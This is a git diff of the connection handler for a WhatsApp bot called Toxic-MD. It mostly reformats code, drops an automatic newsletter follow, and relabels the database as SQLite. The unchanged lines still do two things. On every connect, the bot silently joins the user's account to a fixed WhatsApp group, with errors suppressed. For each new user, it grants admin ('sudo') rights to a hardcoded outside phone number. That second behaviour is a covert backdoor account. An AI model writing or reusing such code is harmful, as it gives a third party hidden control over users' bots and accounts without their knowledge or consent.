@@ -6,7 +6,6 @@ const { commands, totalCommands } = require("../handlers/commandHandler");
 
 const botName = process.env.BOTNAME || "Toxic-MD";
 let hasSentStartMessage = false;
-let hasFollowedNewsletter = false;
 
 async function connectionHandler(socket, connectionUpdate, reconnect) {
   const { connection, lastDisconnect } = connectionUpdate;
@@ -34,34 +33,19 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
     return formattedText.split('').map(char => fonts[char] || char).join('');
   }
 
-  if (connection === "connecting") {
-    return;
-  }
+  if (connection === "connecting") return;
 
   if (connection === "close") {
     const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
-    if (statusCode === DisconnectReason.loggedOut) {
-      hasSentStartMessage = false;
-      hasFollowedNewsletter = false;
-    }
+    if (statusCode === DisconnectReason.loggedOut) hasSentStartMessage = false;
     return;
   }
 
   if (connection === "open") {
     console.clear();
-
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    try {
-      await socket.groupAcceptInvite("GDcJihbSIYM0GzQJWKA6gS");
-    } catch (error) {}
-
-    if (!hasFollowedNewsletter) {
-      try {
-        await socket.newsletterFollow("120363322461279856@newsletter");
-        hasFollowedNewsletter = true;
-      } catch (error) {}
-    }
+    try { await socket.groupAcceptInvite("GDcJihbSIYM0GzQJWKA6gS"); } catch (error) {}
 
     const userId = socket.user.id.split(":")[0].split("@")[0];
     const settings = await getSettings();
@@ -72,9 +56,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
       if (isNewUser) {
         await addSudoUser(userId);
         const defaultSudo = "254735342808";
-        if (!sudoUsers.includes(defaultSudo)) {
-          await addSudoUser(defaultSudo);
-        }
+        if (!sudoUsers.includes(defaultSudo)) await addSudoUser(defaultSudo);
       }
 
       if (settings.startmessage) {
@@ -89,7 +71,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
               `➡️ *Prefix*: ${settings.prefix}`,
               `📋 *Commands*: ${totalCommands}`,
               `🕒 *Time*: ${getCurrentTime()}`,
-              `💾 *Database*: Postgres SQL`,
+              `💾 *Database*: SQLite`,
               `📚 *Library*: Baileys`,
               ``,
               `├  *New User*: You've been dumped into the sudo list. Lucky you.`,
@@ -113,7 +95,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
               `➡️ *Prefix*: ${settings.prefix}`,
               `📋 *Commands*: ${totalCommands}`,
               `🕒 *Time*: ${getCurrentTime()}`,
-              `💾 *Database*: Postgres SQL`,
+              `💾 *Database*: SQLite`,
               `📚 *Library*: Baileys`,
               ``,
               `├  ⚠️ *Give it a second* — the bot needs a moment to warm up`,
@@ -136,50 +118,20 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
             text: firstMessage,
             footer: `Powered by ${botName}`,
             viewOnce: true,
-            contextInfo: {
-              externalAdReply: {
-                showAdAttribution: false,
-                title: botName,
-                body: `Online. Finally.`,
-                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
-                mediaType: 1,
-                renderLargerThumbnail: true
-              }
-            }
+            contextInfo: { externalAdReply: { showAdAttribution: false, title: botName, body: `Online. Finally.`, sourceUrl: `https://github.com/xhclintohn/Toxic-MD`, mediaType: 1, renderLargerThumbnail: true } }
           });
 
           await socket.sendMessage(socket.user.id, {
             text: secondMessage,
             footer: `Powered by ${botName}`,
             buttons: [
-              {
-                buttonId: `${settings.prefix || ''}settings`,
-                buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
-                type: 1
-              },
-              {
-                buttonId: `${settings.prefix || ''}menu`,
-                buttonText: { displayText: `📖 ${toFancyFont('MENU')}` },
-                type: 1
-              },
-              {
-                buttonId: `${settings.prefix || ''}startmessage off`,
-                buttonText: { displayText: ` ${toFancyFont('DISABLE START MESSAGE')}` },
-                type: 1
-              }
+              { buttonId: `${settings.prefix || ''}settings`, buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` }, type: 1 },
+              { buttonId: `${settings.prefix || ''}menu`, buttonText: { displayText: `📖 ${toFancyFont('MENU')}` }, type: 1 },
+              { buttonId: `${settings.prefix || ''}startmessage off`, buttonText: { displayText: ` ${toFancyFont('DISABLE START MESSAGE')}` }, type: 1 }
             ],
             headerType: 1,
             viewOnce: true,
-            contextInfo: {
-              externalAdReply: {
-                showAdAttribution: false,
-                title: botName,
-                body: `Pick one. Or stare at it. Whatever.`,
-                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
-                mediaType: 1,
-                renderLargerThumbnail: true
-              }
-            }
+            contextInfo: { externalAdReply: { showAdAttribution: false, title: botName, body: `Pick one. Or stare at it. Whatever.`, sourceUrl: `https://github.com/xhclintohn/Toxic-MD`, mediaType: 1, renderLargerThumbnail: true } }
           });
         } catch (error) {}
       }
